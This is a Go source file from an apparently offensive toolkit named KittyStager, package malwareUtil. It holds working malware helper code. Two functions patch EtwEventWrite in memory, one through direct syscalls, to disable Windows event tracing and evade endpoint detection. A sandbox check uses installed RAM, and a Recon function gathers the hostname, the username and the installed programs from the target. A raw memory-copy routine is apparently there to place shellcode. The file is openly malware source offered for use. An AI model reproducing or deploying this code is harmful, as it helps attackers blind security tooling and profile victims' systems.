package malwareUtil

import (
	"KittyStager/cmd/util"
	"encoding/json"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"golang.org/x/sys/windows"
	"os"
	"unsafe"
)

var (
	fntdll  = windows.NewLazyDLL("ntdll.dll")
	fucketw = fntdll.NewProc("EtwEventWrite")

	k32                = windows.NewLazyDLL("kernel32.dll")
	WriteProcessMemory = k32.NewProc("WriteProcessMemory")
)

// https://github.com/timwhitez/Doge-Assembly/blob/main/loader/etw.go
// write arbitrary ret opcodes into the ETW event writing function (EtwEventWrite) to bypass ETW
func Etw(hProcess uintptr) {
	var oldProtect uint32
	var patch = []byte{0xc3}

	windows.VirtualProtect(fucketw.Addr(), 1, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	WriteProcessMemory.Call(hProcess, fucketw.Addr(), uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
	windows.VirtualProtect(fucketw.Addr(), 1, oldProtect, &oldProtect)
}

func EtwHell(hProcess uintptr) {
	var oldProtect uint32
	var patch = []byte{0xc3}
	bp, _ := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	//resolve the functions and extract the syscalls
	protect, _ := bp.GetSysID("NtProtectVirtualMemory")
	write, _ := bp.GetSysID("NtWriteVirtualMemory")
	bananaphone.Syscall(protect, fucketw.Addr(), 1, windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	bananaphone.Syscall(write, hProcess, fucketw.Addr(), uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
	bananaphone.Syscall(protect, fucketw.Addr(), 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

func VmCheck() bool {
	var proc = k32.NewProc("GetPhysicallyInstalledSystemMemory")
	var mem uint64
	proc.Call(uintptr(unsafe.Pointer(&mem)))
	// if ram is less than 1GB, return false
	if mem < 1000000 {
		return true
	}
	return false
}

// Recon does some basic recon on the target
func Recon() []byte {
	var iniCheck util.InitialChecks
	// print machine name
	iniCheck.Hostname, _ = os.Hostname()
	//print username
	iniCheck.Username = os.Getenv("USERNAME")
	dir, _ := os.ReadDir("C:\\Program Files")
	for _, file := range dir {
		iniCheck.Dir = append(iniCheck.Dir, file.Name())
	}
	dir86, _ := os.ReadDir("C:\\Program Files (x86)")
	for _, file := range dir86 {
		iniCheck.Dir = append(iniCheck.Dir, file.Name())
	}
	j, _ := json.Marshal(iniCheck)
	return j
}

// https://github.dev/timwhitez/Doge-Gabh/blob/main/example/shellcodecalc/calc.go
func Memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}
